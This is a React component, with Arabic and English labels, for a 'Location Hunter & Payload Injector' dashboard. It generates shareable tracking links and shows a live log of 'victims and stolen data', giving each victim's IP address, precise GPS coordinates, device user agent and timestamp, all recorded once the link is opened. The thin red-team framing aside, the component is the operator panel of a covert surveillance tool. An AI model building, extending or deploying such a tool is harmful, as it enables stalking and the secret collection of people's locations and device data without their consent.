import React, { useState, useEffect } from 'react';
import { Target, Link as LinkIcon, ShieldAlert, Globe, Copy, Check, RefreshCw, Terminal, User, MapPin } from 'lucide-react';
import { HunterStrike } from '../types';

export const HunterInjectionSystem: React.FC = () => {
  const [hunterName, setHunterName] = useState('RedTeam_Op1');
  const [generatedUrl, setGeneratedUrl] = useState<string | null>(null);
  const [hunterId, setHunterId] = useState<string | null>(null);
  const [strikes, setStrikes] = useState<HunterStrike[]>([]);
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);

  const handleGenerateLink = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/hunter/generate-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ hunterName })
      });
      const data = await res.json();
      if (data.success) {
        setGeneratedUrl(data.hunterUrl);
        setHunterId(data.hunterId);
        fetchStrikes(data.hunterId);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const fetchStrikes = async (id?: string) => {
    try {
      const url = id ? `/api/hunter/stats?hunterId=${id}` : '/api/hunter/stats';
      const res = await fetch(url);
      const data = await res.json();
      if (data.success) {
        setStrikes(data.strikes);
      }
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    fetchStrikes();
    const interval = setInterval(() => fetchStrikes(hunterId || undefined), 5000);
    return () => clearInterval(interval);
  }, [hunterId]);

  const copyToClipboard = () => {
    if (generatedUrl) {
      navigator.clipboard.writeText(generatedUrl);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  return (
    <div className="max-w-6xl mx-auto space-y-6">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl">
        <div className="flex items-center gap-3 mb-6 border-b border-slate-800 pb-4">
          <Target className="w-8 h-8 text-rose-500 animate-pulse" />
          <div>
            <h2 className="text-xl font-bold text-white">نظام الصيد والحقن المتقدم (Location Hunter & Payload Injector)</h2>
            <p className="text-sm text-slate-400">توليد روابط تتبع واختبار الأمان لجمع بيانات الأجهزة والمواقع الجغرافية بدقة</p>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div className="space-y-4 bg-slate-950 p-5 rounded-xl border border-slate-800">
            <h3 className="text-sm font-semibold text-slate-300 flex items-center gap-2">
              <LinkIcon className="w-4 h-4 text-cyan-400" /> توليد رابط صيد جديد (Hunter Link Generator)
            </h3>
            <div>
              <label className="block text-xs text-slate-400 mb-1">اسم العملية / الصياد (Operation Name)</label>
              <input 
                type="text" 
                value={hunterName} 
                onChange={e => setHunterName(e.target.value)}
                className="w-full bg-slate-900 border border-slate-800 rounded-xl p-2.5 text-white text-sm focus:outline-none focus:border-cyan-500 font-mono"
              />
            </div>
            <button 
              onClick={handleGenerateLink}
              disabled={loading}
              className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium py-3 rounded-xl transition-all shadow-lg shadow-cyan-900/40 text-sm flex items-center justify-center gap-2"
            >
              <Target className="w-4 h-4" /> توليد رابط الصيد الفوري
            </button>

            {generatedUrl && (
              <div className="mt-4 p-3 bg-slate-900 rounded-xl border border-cyan-500/30 space-y-2">
                <span className="text-xs text-cyan-400 font-semibold block">رابط الصيد المخصص:</span>
                <div className="flex items-center gap-2">
                  <input 
                    type="text" 
                    readOnly 
                    value={generatedUrl} 
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs font-mono text-slate-300 focus:outline-none"
                  />
                  <button 
                    onClick={copyToClipboard}
                    className="bg-slate-800 hover:bg-slate-700 text-white p-2 rounded-lg transition-all"
                    title="نسخ الرابط"
                  >
                    {copied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                  </button>
                </div>
              </div>
            )}
          </div>

          <div className="space-y-4 bg-slate-950 p-5 rounded-xl border border-slate-800 flex flex-col justify-between">
            <div>
              <div className="flex justify-between items-center mb-3">
                <h3 className="text-sm font-semibold text-slate-300 flex items-center gap-2">
                  <ShieldAlert className="w-4 h-4 text-rose-400" /> إحصائيات الضربات والضحايا المسجلة
                </h3>
                <button 
                  onClick={() => fetchStrikes(hunterId || undefined)} 
                  className="text-xs text-slate-400 hover:text-white flex items-center gap-1 bg-slate-900 px-2.5 py-1 rounded-lg border border-slate-800"
                >
                  <RefreshCw className="w-3 h-3" /> تحديث
                </button>
              </div>
              <div className="text-2xl font-bold text-white mb-1 font-mono">{strikes.length} <span className="text-xs text-slate-500 font-normal">عملية ناجحة</span></div>
              <p className="text-xs text-slate-500">يتم تسجيل إبداءات الإعجاب، المواقع الجغرافية، وبيانات الأجهزة فور فتح الرابط المستهدف.</p>
            </div>

            <div className="bg-cyan-500/10 border border-cyan-500/20 p-3 rounded-xl text-xs text-cyan-300 flex items-center gap-2">
              <Terminal className="w-4 h-4 shrink-0" />
              <span>النظام يعمل في وضع التشغيل الكامل (Live Mode) مع تسجيل الـ IP والموقع الجغرافي.</span>
            </div>
          </div>
        </div>

        <div className="space-y-4">
          <h3 className="text-sm font-semibold text-slate-300">سجل الضحايا والبيانات المسروقة (Strikes Log)</h3>
          
          {strikes.length === 0 ? (
            <div className="bg-slate-950 border border-slate-800 rounded-xl p-8 text-center text-slate-500 text-sm">
              لم يتم رصد أي ضحايا حتى الآن. شارك رابط الصيد لبدء جمع البيانات.
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse text-xs">
                <thead>
                  <tr className="border-b border-slate-800 text-slate-400 bg-slate-950">
                    <th className="p-3 text-right">معرف الضحية</th>
                    <th className="p-3 text-right">عنوان IP</th>
                    <th className="p-3 text-right">الموقع الجغرافي</th>
                    <th className="p-3 text-right">نوع الجهاز والمتصفح</th>
                    <th className="p-3 text-right">التوقيت</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60 font-mono">
                  {strikes.map((strike, idx) => (
                    <tr key={idx} className="hover:bg-slate-950/50 transition-colors">
                      <td className="p-3 text-right text-cyan-400 font-bold">{strike.targetId}</td>
                      <td className="p-3 text-right text-slate-300">{strike.ip}</td>
                      <td className="p-3 text-right text-emerald-400">
                        {strike.location ? (
                          <span className="flex items-center gap-1 justify-end">
                            <MapPin className="w-3 h-3" /> {strike.location.lat.toFixed(4)}, {strike.location.lng.toFixed(4)}
                          </span>
                        ) : (
                          <span className="text-slate-600">غير متوفر</span>
                        )}
                      </td>
                      <td className="p-3 text-right text-slate-400 truncate max-w-[200px]" title={strike.userAgent}>
                        {strike.userAgent}
                      </td>
                      <td className="p-3 text-right text-slate-500">{new Date(strike.timestamp).toLocaleString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
